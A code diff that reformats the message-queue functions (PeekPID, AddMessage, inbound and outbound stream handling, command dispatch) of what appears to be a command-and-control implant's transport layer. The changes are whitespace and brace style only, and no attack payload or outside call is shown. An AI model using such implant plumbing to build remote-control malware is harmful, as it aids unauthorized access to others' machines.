@@ -11,7 +11,6 @@ namespace Message {
 
     BOOL PeekPID(PSTREAM Stream) {
         HEXANE
-
         UINT Pid = 0;
 
         x_memcpy(&Pid, Stream->Buffer, 4);
@@ -24,7 +23,6 @@ namespace Message {
 
     VOID AddMessage(PSTREAM Outbound) {
         HEXANE
-
         PSTREAM Head = Ctx->Transport.OutboundQueue;
 
         if (!Ctx->Transport.OutboundQueue) {
@@ -162,8 +160,8 @@ namespace Message {
             goto retry;
 #endif
         } else {
-            Head = Ctx->Transport.OutboundQueue;
 
+            Head = Ctx->Transport.OutboundQueue;
             while (Head) {
                 if (!Head->Ready) {
 
@@ -210,8 +208,7 @@ namespace Message {
             if (PeekPID(Inbound)) {
                 CommandDispatch(Inbound);
                 Stream::DestroyStream(Inbound);
-            }
-            else {
+            } else {
                 Swap        = Inbound;
                 Inbound     = Outbound;
                 Outbound    = Swap;
@@ -228,7 +225,6 @@ namespace Message {
             }
         } else {
             Head = Ctx->Transport.OutboundQueue;
-
             while (Head) {
                 Head->Ready = FALSE;
                 Head = Head->Next;
